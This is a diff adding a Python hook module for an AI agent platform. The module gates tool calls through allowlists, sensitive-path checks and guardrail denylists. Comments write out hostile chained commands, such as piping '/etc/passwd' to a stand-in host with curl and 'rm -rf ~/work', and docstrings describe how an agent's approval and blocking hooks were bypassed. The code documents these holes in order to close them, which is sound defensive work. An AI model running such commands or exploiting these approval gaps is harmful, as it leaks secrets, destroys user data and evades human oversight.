@@ -1,0 +1,1250 @@
+"""Config-driven hook system for PersonalClaw's message pipeline.
+
+Hooks intercept messages and tool calls based on rules in config.json.
+Supports declarative rules and executable script hooks with timeout/sandboxing.
+"""
+
+import asyncio
+import fnmatch
+import json
+import logging
+import time
+import uuid
+from dataclasses import asdict, dataclass, field
+from pathlib import Path
+
+from personalclaw.atomic_write import atomic_write
+from personalclaw.safety_flags import strict_bool
+from personalclaw.security import is_denied, is_sensitive_bash_command, is_sensitive_path
+
+logger = logging.getLogger(__name__)
+
+
+# ── Hook Results ──
+
+# Message hook action constants
+HOOK_PASSTHROUGH = "passthrough"
+HOOK_REPLY = "reply"
+HOOK_MODIFY = "modify"
+HOOK_INJECT_CONTEXT = "inject_context"
+
+# Tool hook action constants
+TOOL_ALLOW = "allow"
+TOOL_AUTO_APPROVE = "auto_approve"
+TOOL_DENY = "deny"
+
+# Script hook events — agent loop lifecycle
+HOOK_EVENT_AGENT_SPAWN = "AgentSpawn"
+HOOK_EVENT_USER_PROMPT_SUBMIT = "UserPromptSubmit"
+HOOK_EVENT_PRE_TOOL_USE = "PreToolUse"
+HOOK_EVENT_POST_TOOL_USE = "PostToolUse"
+HOOK_EVENT_STOP = "Stop"
+HOOK_EVENT_PRE_RESPONSE = "PreResponse"
+HOOK_EVENT_POST_RESPONSE = "PostResponse"
+HOOK_EVENT_SESSION_START = "SessionStart"
+HOOK_EVENT_SESSION_END = "SessionEnd"
+HOOK_EVENT_MEMORY_WRITE = "MemoryWrite"
+HOOK_EVENT_ERROR = "Error"
+HOOK_EVENT_CONTEXT_COMPACT = "ContextCompact"
+HOOK_EVENT_SUBAGENT_SPAWN = "SubagentSpawn"
+HOOK_EVENT_TASK_COMPLETE = "TaskComplete"
+HOOK_EVENT_APPROVAL_REQUEST = "ApprovalRequest"
+
+HOOK_EVENTS = (
+    HOOK_EVENT_AGENT_SPAWN,
+    HOOK_EVENT_SESSION_START,
+    HOOK_EVENT_USER_PROMPT_SUBMIT,
+    HOOK_EVENT_PRE_TOOL_USE,
+    HOOK_EVENT_POST_TOOL_USE,
+    HOOK_EVENT_PRE_RESPONSE,
+    HOOK_EVENT_POST_RESPONSE,
+    HOOK_EVENT_MEMORY_WRITE,
+    HOOK_EVENT_CONTEXT_COMPACT,
+    HOOK_EVENT_SUBAGENT_SPAWN,
+    HOOK_EVENT_TASK_COMPLETE,
+    HOOK_EVENT_APPROVAL_REQUEST,
+    HOOK_EVENT_ERROR,
+    HOOK_EVENT_SESSION_END,
+    HOOK_EVENT_STOP,
+)
+
+
+# ── Lifecycle event catalog ──
+# The authoritative description of each lifecycle event and the ``$variables`` an
+# action templated on it can interpolate. This lives next to ``_fire`` (which
+# assembles the event payload below) so the catalog and the payload it documents
+# can never drift. ``GET /api/triggers/variables`` serves this to both UIs — they
+# do NOT mirror it. Each var is a ``$NAME`` placeholder substituted by
+# ``action_providers.template.render_template`` (``$EVENT``/``$CONTEXT`` plus any
+# payload key). ``blocking`` marks events whose action can short-circuit the loop.
+
+# Every event carries these (the shared base every fire assembles + the matcher's
+# context string).
+_LIFECYCLE_BASE_VARS = ("$EVENT", "$CONTEXT", "$cwd")
+
+LIFECYCLE_EVENT_CATALOG: tuple[dict, ...] = (
+    {
+        "event": HOOK_EVENT_AGENT_SPAWN,
+        "label": "Agent spawn",
+        "desc": "A new agent session is created.",
+        "vars": _LIFECYCLE_BASE_VARS,
+    },
+    {
+        "event": HOOK_EVENT_SESSION_START,
+        "label": "Session start",
+        "desc": "A chat/agent session begins.",
+        "vars": _LIFECYCLE_BASE_VARS,
+    },
+    {
+        "event": HOOK_EVENT_USER_PROMPT_SUBMIT,
+        "label": "User prompt submit",
+        "desc": "The user submits a turn — before the agent runs.",
+        "vars": (*_LIFECYCLE_BASE_VARS, "$prompt"),
+    },
+    {
+        "event": HOOK_EVENT_PRE_TOOL_USE,
+        "label": "Pre tool use",
+        "desc": "Before a tool runs — can block it.",
+        "vars": (*_LIFECYCLE_BASE_VARS, "$tool_name", "$tool_input"),
+        "blocking": True,
+    },
+    {
+        "event": HOOK_EVENT_POST_TOOL_USE,
+        "label": "Post tool use",
+        "desc": "After a tool runs.",
+        "vars": (*_LIFECYCLE_BASE_VARS, "$tool_name", "$tool_input", "$tool_response"),
+    },
+    {
+        "event": HOOK_EVENT_PRE_RESPONSE,
+        "label": "Pre response",
+        "desc": "Before the agent streams its reply.",
+        "vars": _LIFECYCLE_BASE_VARS,
+    },
+    {
+        "event": HOOK_EVENT_POST_RESPONSE,
+        "label": "Post response",
+        "desc": "After the agent finishes its reply.",
+        "vars": _LIFECYCLE_BASE_VARS,
+    },
+    {
+        "event": HOOK_EVENT_MEMORY_WRITE,
+        "label": "Memory write",
+        "desc": "The agent writes a memory/lesson.",
+        "vars": _LIFECYCLE_BASE_VARS,
+    },
+    {
+        "event": HOOK_EVENT_CONTEXT_COMPACT,
+        "label": "Context compact",
+        "desc": "The conversation context is summarized.",
+        "vars": _LIFECYCLE_BASE_VARS,
+    },
+    {
+        "event": HOOK_EVENT_SUBAGENT_SPAWN,
+        "label": "Subagent spawn",
+        "desc": "A subagent is spawned.",
+        "vars": (*_LIFECYCLE_BASE_VARS, "$subagent_id", "$parent_session_key", "$agent_role"),
+    },
+    {
+        "event": HOOK_EVENT_TASK_COMPLETE,
+        "label": "Task complete",
+        "desc": "A task finishes.",
+        "vars": _LIFECYCLE_BASE_VARS,
+    },
+    {
+        "event": HOOK_EVENT_APPROVAL_REQUEST,
+        "label": "Approval request",
+        "desc": "A tool needs approval.",
+        "vars": (*_LIFECYCLE_BASE_VARS, "$tool_name"),
+    },
+    {
+        "event": HOOK_EVENT_ERROR,
+        "label": "Error",
+        "desc": "An error occurs in the loop.",
+        "vars": _LIFECYCLE_BASE_VARS,
+    },
+    {
+        "event": HOOK_EVENT_SESSION_END,
+        "label": "Session end",
+        "desc": "A session ends.",
+        "vars": _LIFECYCLE_BASE_VARS,
+    },
+    {
+        "event": HOOK_EVENT_STOP,
+        "label": "Stop",
+        "desc": "The agent loop stops.",
+        "vars": _LIFECYCLE_BASE_VARS,
+    },
+)
+
+#: Lifecycle events whose hook can short-circuit the loop (exit 2 → the tool is rejected).
+#: Derived from the catalog's ``blocking`` flag so the fact is declared exactly once, and read by
+#: :func:`hook_enforcement` and the trigger read model rather than re-listed per surface.
+BLOCKING_EVENTS: frozenset[str] = frozenset(
+    str(e["event"]) for e in LIFECYCLE_EVENT_CATALOG if e.get("blocking")
+)
+
+#: The three enforcement states of a lifecycle hook. Spelled as data because they are a wire
+#: contract two UIs render, and because "armed vs unarmed" needs a third value for the events
+#: where arming is meaningless — otherwise a `Stop` hook reads as a disarmed safety control.
+ENFORCEMENT_ENFORCING = "enforcing"
+ENFORCEMENT_NOT_ENFORCING = "not_enforcing"
+ENFORCEMENT_ADVISORY = "advisory"
+ENFORCEMENT_STATES: frozenset[str] = frozenset(
+    {ENFORCEMENT_ENFORCING, ENFORCEMENT_NOT_ENFORCING, ENFORCEMENT_ADVISORY}
+)
+
+
+def hook_enforcement(event: str, *, enabled: bool, bound: bool) -> str:
+    """Whether a lifecycle hook on ``event`` can actually block, given its binding.
+
+    🔴 **The measured hole this exists to close (G40).** The same ``PreToolUse`` hook blocks or
+    does not block depending on who references it, and nothing said which state a user's hook was
+    in. Driven twice against the same six lifecycle hooks:
+
+    * **Unbound** (no agent profile references the hook id) — the hook fired three times on the
+      informational path and the write **still landed**. ``run_count`` climbed to 3, which reads
+      as "my policy hook is working".
+    * **Bound** (hook ids on the session agent's ``triggers``) — the tool line read
+      ``(hook blocked: …)`` and the file was never created.
+
+    Two firing paths, one hook kind:
+
+    * :meth:`ScriptHookStore.fire_for_ids` — agent-scoped, reached from
+      ``chat_runner._fire`` and ``provider_bridge``'s native ``hook_fire``. Its ``BLOCKED:``
+      sentinel is what rejects a tool, and it fires **only** hook ids the session agent
+      references. ``hook_ids`` empty → fires nothing.
+    * :func:`fire_tool_hooks` → :meth:`ScriptHookStore.fire` — global, informational. Reached
+      from the ACP ``EVENT_TOOL_CALL`` seam, ``subagent`` and ``llm_helpers``, where the tool is
+      already running. Its results are discarded, so exit 2 there changes nothing.
+
+    So a blocking hook enforces only while it is enabled AND bound. ``advisory`` is returned for
+    the events that have no blocking seam at all, so an unbound ``Stop`` hook is not mislabelled
+    as a disarmed control. Never returns ``enforcing`` on a maybe: an unresolvable binding is
+    reported ``not_enforcing``, because a control that only *looks* armed is worse than none.
+
+    **This is the hook's CAPABILITY, not a record of a fire (G89).** A hook can be
+    ``enforcing`` — bound, enabled, blocking event — and still be *reached* through the
+    informational seam for a given tool call, because an ACP ``EVENT_TOOL_CALL`` frame arrives
+    already auto-approved. What that individual fire did is
+    ``advisory`` vs ``blocked`` on the hook's ``last_status``; the two fields
+    answer different questions and both are needed to read the row.
+    """
+    if event not in BLOCKING_EVENTS:
+        return ENFORCEMENT_ADVISORY
+    return ENFORCEMENT_ENFORCING if (enabled and bound) else ENFORCEMENT_NOT_ENFORCING
+
+
+@dataclass
+class HookResult:
+    """Result of running message hooks."""
+
+    action: str  # HOOK_PASSTHROUGH, HOOK_REPLY, HOOK_MODIFY, HOOK_INJECT_CONTEXT
+    text: str = ""
+
+    @staticmethod
+    def passthrough() -> "HookResult":
+        return HookResult(action=HOOK_PASSTHROUGH)
+
+    @staticmethod
+    def reply(text: str) -> "HookResult":
+        return HookResult(action=HOOK_REPLY, text=text)
+
+    @staticmethod
+    def modify(text: str) -> "HookResult":
+        return HookResult(action=HOOK_MODIFY, text=text)
+
+    @staticmethod
+    def inject_context(text: str) -> "HookResult":
+        return HookResult(action=HOOK_INJECT_CONTEXT, text=text)
+
+
+@dataclass
+class ToolHookResult:
+    action: str  # TOOL_ALLOW, TOOL_AUTO_APPROVE, TOOL_DENY
+    reason: str = ""
+
+    @staticmethod
+    def allow() -> "ToolHookResult":
+        return ToolHookResult(action=TOOL_ALLOW)
+
+    @staticmethod
+    def auto_approve() -> "ToolHookResult":
+        return ToolHookResult(action=TOOL_AUTO_APPROVE)
+
+    @staticmethod
+    def deny(reason: str) -> "ToolHookResult":
+        return ToolHookResult(action=TOOL_DENY, reason=reason)
+
+
+# ── Config Types ──
+
+
+@dataclass
+class ContextRule:
+    """Inject context when any trigger keyword matches."""
+
+    triggers: list[str] = field(default_factory=list)
+    context: str = ""
+
+
+@dataclass
+class AutoReplyHook:
+    """Auto-reply without LLM for pattern matches."""
+
+    pattern: str = ""
+    reply: str = ""
+    exact: bool = False
+
+
+@dataclass
+class TransformHook:
+    """Transform message before sending to LLM."""
+
+    pattern: str = ""
+    prefix: str = ""
+    suffix: str = ""
+
+
+@dataclass
+class HooksConfig:
+    """Loaded from config.json ``hooks`` section."""
+
+    auto_approve_tools: list[str] = field(default_factory=list)
+    auto_approve_sources: list[str] = field(default_factory=list)
+    auto_approve_subagent_spawn: bool = False
+    auto_approve_subagent_tools: bool = False
+    auto_deny_tools: list[str] = field(default_factory=list)
+    auto_replies: list[AutoReplyHook] = field(default_factory=list)
+    transforms: list[TransformHook] = field(default_factory=list)
+    context_rules: list[ContextRule] = field(default_factory=list)
+
+    @classmethod
+    def from_dict(cls, data: dict) -> "HooksConfig":
+        """Parse hooks config from a dict (config.json ``hooks`` section)."""
+        auto_replies = [
+            AutoReplyHook(
+                pattern=h.get("pattern", ""),
+                reply=h.get("reply", ""),
+                exact=h.get("exact", False),
+            )
+            for h in data.get("auto_replies", [])
+        ]
+        transforms = [
+            TransformHook(
+                pattern=h.get("pattern", ""),
+                prefix=h.get("prefix", ""),
+                suffix=h.get("suffix", ""),
+            )
+            for h in data.get("transforms", [])
+        ]
+        context_rules = [
+            ContextRule(
+                triggers=r.get("triggers", []),
+                context=r.get("context", ""),
+            )
+            for r in data.get("context_rules", [])
+        ]
+        return cls(
+            auto_approve_tools=data.get("auto_approve_tools", []),
+            auto_approve_sources=data.get("auto_approve_sources", []),
+            auto_approve_subagent_spawn=strict_bool(
+                data.get("auto_approve_subagent_spawn"),
+                field="hooks.auto_approve_subagent_spawn",
+            ),
+            auto_approve_subagent_tools=strict_bool(
+                data.get("auto_approve_subagent_tools"),
+                field="hooks.auto_approve_subagent_tools",
+            ),
+            auto_deny_tools=data.get("auto_deny_tools", []),
+            auto_replies=auto_replies,
+            transforms=transforms,
+            context_rules=context_rules,
+        )
+
+
+# ── HookManager ──
+
+
+class HookManager:
+    """Process messages and tool calls through config-driven rules."""
+
+    def __init__(self, config: HooksConfig | None = None):
+        self._config = config or HooksConfig()
+
+    def reload(self, config: HooksConfig) -> None:
+        """Hot-reload hooks config."""
+        self._config = config
+
+    @property
+    def auto_approve_subagent_spawn(self) -> bool:
+        return self._config.auto_approve_subagent_spawn
+
+    @property
+    def auto_approve_subagent_tools(self) -> bool:
+        return self._config.auto_approve_subagent_tools
+
+    # ── Message hooks ──
+
+    def on_message(self, text: str) -> HookResult:
+        """Run message hooks. Returns first match or passthrough."""
+        lower = text.lower()
+
+        # Auto-replies (first match wins)
+        for ar_hook in self._config.auto_replies:
+            if ar_hook.exact:
+                if lower == ar_hook.pattern.lower():
+                    return HookResult.reply(ar_hook.reply)
+            else:
+                if ar_hook.pattern.lower() in lower:
+                    return HookResult.reply(ar_hook.reply)
+
+        # Transforms (first match wins)
+        for tf_hook in self._config.transforms:
+            if tf_hook.pattern.lower() in lower:
+                modified = text
+                if tf_hook.prefix:
+                    modified = f"{tf_hook.prefix}\n{modified}"
+                if tf_hook.suffix:
+                    modified = f"{modified}\n{tf_hook.suffix}"
+                return HookResult.modify(modified)
+
+        # Context injection (all matching rules)
+        injected: list[str] = []
+        for rule in self._config.context_rules:
+            if any(t.lower() in lower for t in rule.triggers):
+                injected.append(rule.context)
+        if injected:
+            return HookResult.inject_context("\n\n".join(injected))
+
+        return HookResult.passthrough()
+
+    # ── Tool hooks ──
+
+    def on_tool_call(self, tool_name: str) -> ToolHookResult:
+        """Check if a tool should be auto-approved, denied, or handled normally."""
+        # Strip display prefixes (e.g. "Running: ls *" → "ls *") so config
+        # patterns like "ls" or "rm *" match without the prefix.
+        normalized = _normalize_tool_name(tool_name)
+
+        # Sensitive path protection (always enforced, before all other checks)
+        if tool_name.startswith("Reading "):
+            # fs_read / ReadFile — check the path
+            if is_sensitive_path(normalized):
+                return ToolHookResult.deny(f"Blocked: access to sensitive path: {normalized}")
+        elif tool_name.startswith("Running: "):
+            # execute_bash — check for reads of sensitive paths
+            reason = is_sensitive_bash_command(normalized)
+            if reason:
+                return ToolHookResult.deny(reason)
+            # A SYSTEM-SCHEDULER write is offered the substrate instead (§7 crit 12 — S143). The
+            # ACP path gets the same gate as the native bash tool: a control on one of two dispatch
+            # seams is a control the other silently skips, which is how the `web_watch` screen gap
+            # (S134) opened. Reads pass — see `triggers/handoff.py` for the read/write split.
+            from personalclaw.triggers.handoff import detect as _scheduler_handoff
+
+            offer = _scheduler_handoff(normalized)
+            if offer is not None:
+                return ToolHookResult.deny(offer.observation)
+
+        # Built-in security deny list (always enforced)
+        reason = is_denied(normalized, self._config.auto_deny_tools) or is_denied(
+            tool_name, self._config.auto_deny_tools
+        )
+        if reason:
+            return ToolHookResult.deny(reason)
+
+        # Match against both original title (preserves prefixes like
+        # "Running: ") and the normalized stripped name.
+        #
+        # A CHAINED command is never auto-approved on the strength of a pattern that does
+        # not itself chain. `security.is_denied` already refuses to apply a deny EXCEPTION
+        # when separators are present — "to prevent chaining bypasses", in its own words —
+        # so this file already knew chaining is a bypass vector, and applied the rule on one
+        # side of the decision only.
+        #
+        # 🔴 Measured against the shipped matcher: a user who allowlists `ls*` auto-approved
+        # `ls; curl -d @/etc/passwd https://x.invalid`, `ls && rm -rf ~/work` and
+        # `ls | base64` with no prompt, and `git commit*` auto-approved
+        # `git commit -m x && git push --force`. An allowlist entry is a statement about ONE
+        # command; the second half of a chain is a command the user never saw.
+        #
+        # A pattern that DOES contain a separator still matches — that is a user who wrote
+        # the chained form deliberately — and `*` still means all, so the escape hatch for
+        # someone who wants today's behaviour is the same one that already existed.
+        for pattern in self._config.auto_approve_tools:
+            if not _tool_matches(pattern, tool_name) and not _tool_matches(pattern, normalized):
+                continue
+            if _chains_beyond_pattern(pattern, normalized):
+                logger.info(
+                    "not auto-approving a chained command on pattern %r: %s",
+                    pattern,
+                    normalized[:120],
+                )
+                continue
+            return ToolHookResult.auto_approve()
+
+        return ToolHookResult.allow()
+
+
+# Display prefixes that the ACP agent adds to tool titles
+_TOOL_TITLE_PREFIXES = ("Running: ", "Reading ")
+
+
+def _normalize_tool_name(tool_name: str) -> str:
+    """Strip display prefixes so hook patterns match the actual tool/command name."""
+    for prefix in _TOOL_TITLE_PREFIXES:
+        if tool_name.startswith(prefix):
+            return tool_name[len(prefix) :]
+    return tool_name
+
+
+def _chains_beyond_pattern(pattern: str, command: str) -> bool:
+    """True when *command* chains and *pattern* does not authorise chaining.
+
+    The separator set is `security._CMD_SEPARATOR_RE` — the SAME one the deny path uses for
+    exactly this reason, imported rather than restated so the two halves of the decision
+    cannot drift into disagreeing about what a chain is.
+
+    Three patterns are exempt, and the first two are the reason this is a function rather
+    than an inline check:
+
+    * `*` — authorises everything by construction.
+    * A CLASS-WIDE pattern like `Running: *` or `Reading *`, which reduces to `*` once the
+      display prefix is stripped. It names no command, so there is no "the command the user
+      recognised" for a chain to be appended to — the user said "every shell call". The
+      existing `test_running_prefix_pattern_auto_approves` documents exactly this with
+      `Running: export PATH=x && npm run test`, and it is what distinguishes a class-wide
+      grant from `Running: ls*`, which names one command and stays guarded.
+    * A pattern that itself contains a separator — a user who wrote the chained form meant it.
+    """
+    from personalclaw.security import _CMD_SEPARATOR_RE
+
+    bare = pattern.strip()
+    for prefix in _TOOL_TITLE_PREFIXES:
+        if bare.startswith(prefix):
+            bare = bare[len(prefix) :].strip()
+            break
+    if bare in ("*", "") or _CMD_SEPARATOR_RE.search(pattern):
+        return False
+    return bool(_CMD_SEPARATOR_RE.search(command))
+
+
+def _tool_matches(pattern: str, tool_name: str) -> bool:
+    """Match a tool pattern against a tool name.
+
+    Supports: exact, ``prefix*``, ``*suffix``, ``*contains*``, ``*`` (all).
+    Case-insensitive.
+    """
+    if pattern == "*":
+        return True
+    return fnmatch.fnmatch(tool_name.lower(), pattern.lower())
+
+
+def validate_file_path(raw: str) -> str | None:
+    """Validate and canonicalize a file path for dashboard file I/O.
+
+    Enforces: is_sensitive_path(), realpath canonicalization.
+    Returns the canonical path or None if rejected.
+
+    A validator ANSWERS; it does not raise (issue 352). `os.path.realpath` on a path holding a
+    NUL byte raises `ValueError: embedded null character`, and this function had no guard — so
+    `?path=/tmp/a%00b` left an unhandled exception to become a raw 500 out of every endpoint
+    that funnels here (`file-read`, `file-write`, `file-move`, `create-dir`, uploads, prompts).
+    Measured: `validate_file_path("/tmp/a\\x00b")` raised rather than returning None.
+
+    The `except` is the whole guard, deliberately. A NUL is the instance that was reported; "the
+    OS refused to canonicalize this" is the class, so any future member gets the same refusal
+    rather than a new 500. Both `ValueError` and `OSError` are caught because `realpath` can raise
+    either depending on the input and platform.
+
+    An explicit `"\\x00" in raw` check sat here first and was removed: mutation testing showed it
+    could not change the answer, because the `except` already returns None for exactly those
+    inputs. The NUL check that IS load-bearing lives in `security.is_sensitive_path`, which
+    catches-and-continues rather than returning, and so needs to refuse on its own.
+    """
+    import os
+
+    if not raw:
+        return None
+    try:
+        path = os.path.realpath(os.path.expanduser(raw))
+    except (ValueError, OSError):
+        logger.debug("validate_file_path: uncanonicalizable path rejected", exc_info=True)
+        return None
+    if is_sensitive_path(path):
+        return None
+    return path
+
+
+def safe_read_file(path: str) -> str:
+    """Read a file after enforcing ``is_sensitive_path``.
+
+    Raises ``PermissionError`` if the path is sensitive.
+
+    A NUL byte makes `Path.resolve()` raise `ValueError` (issue 352) — the same defect as in
+    `validate_file_path`, reached through a different call shape. Refused as `PermissionError`
+    so the answer is this function's OWN documented refusal: every caller already handles that,
+    and none of them expected a `ValueError` from a path argument.
+    """
+    from pathlib import Path
+
+    try:
+        resolved = str(Path(path).expanduser().resolve())
+    except (ValueError, OSError) as exc:
+        raise PermissionError(f"Blocked: unusable path: {exc}") from exc
+    if is_sensitive_path(resolved):
+        raise PermissionError(f"Blocked: access to sensitive path: {resolved}")
+    return Path(resolved).read_text(encoding="utf-8")
+
+
+MAX_FILE_BYTES = 50 * 1024 * 1024  # 50 MB safety cap
+
+
+class FileTooLargeError(Exception):
+    """Raised when a file exceeds MAX_FILE_BYTES."""
+
+
+def safe_read_file_bytes(raw: str) -> bytes | None:
+    """Read file bytes through centralized is_sensitive_path() enforcement.
+
+    Returns file content as bytes, or None if path is rejected or unreadable.
+    """
+    path = validate_file_path(raw)
+    if path is None:
+        return None
+    from pathlib import Path
+
+    p = Path(path)
+    try:
+        with p.open("rb") as fh:
+            data = fh.read(MAX_FILE_BYTES + 1)
+        if len(data) > MAX_FILE_BYTES:
+            raise FileTooLargeError(f"File exceeds {MAX_FILE_BYTES // (1024 * 1024)} MB safety cap")
+        return data
+    except OSError:
+        return None
+
+
+# ── Script Hooks ──
+
+
+@dataclass
+class ScriptHook:
+    """Executable hook that runs on a trigger event via a registered ActionProvider.
+
+    Each hook record names its provider (``bash``, ``webhook``, …) and stores
+    provider-specific config (e.g. ``{"command": "..."}`` for bash,
+    ``{"url": "...", "method": "POST"}`` for webhook). The provider's
+    ``execute()`` method handles the actual side-effect.
+
+    Bash provider follows the ACP agent hook semantics:
+    - exit 0: success (stdout → context for AgentSpawn/UserPromptSubmit)
+    - exit 2: block tool (PreToolUse only, stderr → LLM)
+    - other: warning (stderr shown to user)
+    """
+
+    id: str = ""
+    name: str = ""
+    event: str = HOOK_EVENT_USER_PROMPT_SUBMIT
+    matcher: str = ""  # tool matcher for PreToolUse/PostToolUse (empty = all tools)
+    provider: str = "bash"
+    provider_config: dict = field(default_factory=dict)
+    timeout: int = 30  # seconds
+    enabled: bool = True
+    last_run: float = 0.0
+    # "ok" | "error" | "timeout" | "launched" | "queued" | "skipped_incident" | "held_for_rung" |
+    # "blocked" (the exit-2 block was HONORED, or guardrails refused the action) | "advisory" (the
+    # script asked to block and the seam could not honor it — G89). Every literal must have a key
+    # in `triggers.history.HOOK_STATUS_TO_OUTCOME`, which reports an unmapped one as a failure.
+    last_status: str = ""
+    run_count: int = 0
+
+    def to_dict(self) -> dict:
+        return asdict(self)
+
+    @classmethod
+    def from_dict(cls, data: dict) -> "ScriptHook":
+        return cls(
+            id=data.get("id", str(uuid.uuid4())[:8]),
+            name=data.get("name", ""),
+            event=data.get("event", HOOK_EVENT_USER_PROMPT_SUBMIT),
+            matcher=data.get("matcher", ""),
+            provider=data.get("provider", "bash"),
+            provider_config=dict(data.get("provider_config") or {}),
+            timeout=data.get("timeout", 30),
+            enabled=data.get("enabled", True),
+            last_run=data.get("last_run", 0.0),
+            last_status=data.get("last_status", ""),
+            run_count=data.get("run_count", 0),
+        )
+
+
+@dataclass
+class ScriptHookResult:
+    """Result of executing a script hook."""
+
+    hook_id: str
+    hook_name: str
+    event: str
+    stdout: str = ""
+    stderr: str = ""
+    exit_code: int = -1
+    error: str = ""
+    duration_ms: int = 0
+
+    @property
+    def blocked(self) -> bool:
+        """PreToolUse exit code 2 = block tool."""
+        return self.exit_code == 2
+
+    @property
+    def succeeded(self) -> bool:
+        return self.exit_code == 0
+
+
+async def run_script_hook(
+    hook: ScriptHook,
+    context: str = "",
+    hook_event: dict | None = None,
+    *,
+    enforced: bool = False,
+    test: bool = False,
+) -> ScriptHookResult:
+    """Dispatch hook execution through its registered ActionProvider.
+
+    ``enforced`` declares that THIS fire's result is consumed as a gate — the caller reads the
+    exit-2 signal and rejects the tool. It decides which status an exit 2 records: ``blocked``
+    when the block was honored, ``advisory`` when it was only reported (G89).
+
+    **The default is False on purpose.** Every caller that does not gate — the informational
+    :func:`fire_tool_hooks` seam, the "Run now" button in the trigger UI, any future site — gets
+    the honest status without knowing this parameter exists. Claiming enforcement has to be
+    opt-in, for the same reason :func:`hook_enforcement` never returns ``enforcing`` on a maybe.
+
+    ``test`` marks a REHEARSAL (the panel's Test button), mirroring the event-trigger fire
+    seam (#609): every gate — incident, denylist, rung routing — is preserved and NOT
+    bypassed, and the action genuinely executes, but (a) the payload is tagged ``test`` so a
+    provider can tell a rehearsal from the real thing, and (b) nothing is written into the
+    hook's ``run_count`` / ``last_run`` / ``last_status`` — that is the trigger's REAL fire
+    history, and "Ran 2×  · ok" where both runs were Test clicks is the UI's only claim about
+    a trigger that has never actually fired.
+    """
+    import os
+
+    from personalclaw.action_providers import get_action_provider
+    from personalclaw.action_providers.base import ActionContext
+    from personalclaw.action_providers.registry import _ensure_default_providers_registered
+
+    _ensure_default_providers_registered()
+
+    if hook_event is None:
+        hook_event = {"hook_event_name": hook.event, "cwd": os.getcwd()}
+    if test:
+        # The event-path contract verbatim (event_triggers.fire_event_trigger): the tag
+        # rides the payload so a provider can tell a rehearsal from the real thing.
+        # Copied first — the caller's dict is not ours to mutate.
+        hook_event = dict(hook_event)
+        hook_event["test"] = True
+
+    def _record(status: str) -> None:
+        # Every terminal branch records through here so the rehearsal rule cannot
+        # drift per branch: a test NEVER writes the hook's real fire history.
+        # The conditional closes the vocabulary at this single choke point — the
+        # status rail infers exactly this tuple (plus the "error" fallback) and
+        # checks each member against HOOK_STATUS_TO_OUTCOME, so a branch inventing
+        # a status is a caught red and an unmapped one degrades to "error" rather
+        # than shipping unmapped.
+        if test:
+            return
+        hook.last_run = time.time()
+        hook.last_status = (
+            status
+            if status
+            in (
+                "ok",
+                "error",
+                "timeout",
+                "launched",
+                "queued",
+                "blocked",
+                "advisory",
+                "held_for_rung",
+                "skipped_incident",
+            )
+            else "error"
+        )
+        hook.run_count += 1
+
+    provider = get_action_provider(hook.provider)
+    if provider is None:
+        _record("error")
+        return ScriptHookResult(
+            hook_id=hook.id,
+            hook_name=hook.name,
+            event=hook.event,
+            error=f"Unknown action provider {hook.provider!r}",
+        )
+
+    ctx = ActionContext(event=hook.event, context=context, payload=hook_event)
+    # Incident kill switch (§1.3): a script hook's ACTION is an automated
+    # side-effect (bash/webhook/spawn), so it is suspended during an incident even
+    # if its triggering event occurred in an interactive turn — the chat STREAM
+    # keeps flowing (a separate path); only the automated action pauses.
+    from personalclaw.guardrails.incident import incident_active
+
+    if incident_active():
+        _record("skipped_incident")
+        return ScriptHookResult(
+            hook_id=hook.id,
+            hook_name=hook.name,
+            event=hook.event,
+            error="skipped: incident mode active",
+        )
+    # Denylist gate (AUTONOMY-GUARDRAILS §1.2): a hook's action config is checked
+    # BEFORE dispatch, so an app-contributed provider inherits the denylist. A
+    # blocked action returns a blocked result rather than executing.
+    from personalclaw.guardrails.denylist import enforce_action
+    from personalclaw.guardrails.policy import unattended_dispatch_key
+
+    # `parent_session_key` rides the event payload when a subagent fired the hook
+    # (E11-P3); it lets the run's SafetyProfile layer its extra deny globs.
+    #
+    # 🔴 A top-level fire omitted it → "" → classified ATTENDED → INTERACTIVE, so the whole
+    # profile layer was skipped (PHF-8). By the same reasoning the incident kill switch
+    # above already applies — a hook's ACTION is an automated side-effect even when its
+    # triggering event happened in an interactive turn — a hook fire with no parent session
+    # is an unattended dispatch, and now resolves as one.
+    _session_key = str(hook_event.get("parent_session_key", "")) or unattended_dispatch_key(
+        f"hook:{hook.id}"
+    )
+    _deny = enforce_action(
+        hook.provider,
+        hook.provider_config,
+        ctx,
+        session_key=_session_key,
+    )
+    if _deny.blocked:
+        _record("blocked")
+        return ScriptHookResult(
+            hook_id=hook.id,
+            hook_name=hook.name,
+            event=hook.event,
+            error=f"blocked by guardrails denylist: {_deny.reason}",
+        )
+    # Rung routing (AUTONOMY-GUARDRAILS §5.2), composed with the denylist gate above and
+    # sitting ON TOP of it: a rung never relaxes a block, an incident, or a budget pause.
+    # The route comes from the provider NAME alone — the name→type mapping lives on the
+    # declaration (`ActionTypeSpec.providers`), so an app-contributed provider is routed by
+    # these same lines with no branch of its own here.
+    from personalclaw.guardrails.rungs import announce_withheld, record_reversal
+    from personalclaw.guardrails.rungs import route_provider_action as _route_action
+
+    route = _route_action(hook.provider, session_key=_session_key)
+    if not route.executes:
+        announce_withheld(
+            route,
+            title=f"{hook.name or hook.provider} is waiting for you",
+            body=(
+                f"The {hook.provider!r} action on the {hook.event} event did not run: "
+                f"{route.reason}."
+            ),
+            refs={"hook": hook.id, "provider": hook.provider},
+            dedup_key=f"autonomy_hold:{route.key}:hook:{hook.id}",
+        )
+        _record("held_for_rung")
+        return ScriptHookResult(
+            hook_id=hook.id,
+            hook_name=hook.name,
+            event=hook.event,
+            error=f"held for your approval: {route.reason}",
+        )
+    try:
+        result = await provider.execute(hook.provider_config, ctx, timeout=hook.timeout)
+    except Exception as exc:  # noqa: BLE001 - a misbehaving provider must not crash the seam
+        # PLATFORM-LEGIBILITY §2: a provider that RAISES (rather than returning a
+        # failed result) is wrapped in the shared WHAT/WHY/FIX envelope here, so
+        # app-contributed providers inherit it without knowing it exists.
+        from personalclaw.action_providers import provider_failure
+
+        logger.warning("Action provider %r raised for hook %s", hook.provider, hook.id)
+        _record("error")
+        agent_error = provider_failure(hook.provider, exc)
+        return ScriptHookResult(
+            hook_id=hook.id,
+            hook_name=hook.name,
+            event=hook.event,
+            error=agent_error.render(),
+        )
+
+    if result.blocked:
+        # 🔴 REPORTED ≠ ENFORCED (G89). `ActionResult.blocked` is a REQUEST ("PreToolUse exit_code 2
+        # is a block signal"), not evidence that anything was stopped, and only the gating seam
+        # turns it into a refusal. Writing `blocked` for any exit 2 is what let an informational
+        # fire report `blocked` beside `enforcement: enforcing` while the out-of-workspace write it
+        # claimed to stop landed on disk — measured on codex and again on claude-code, where the
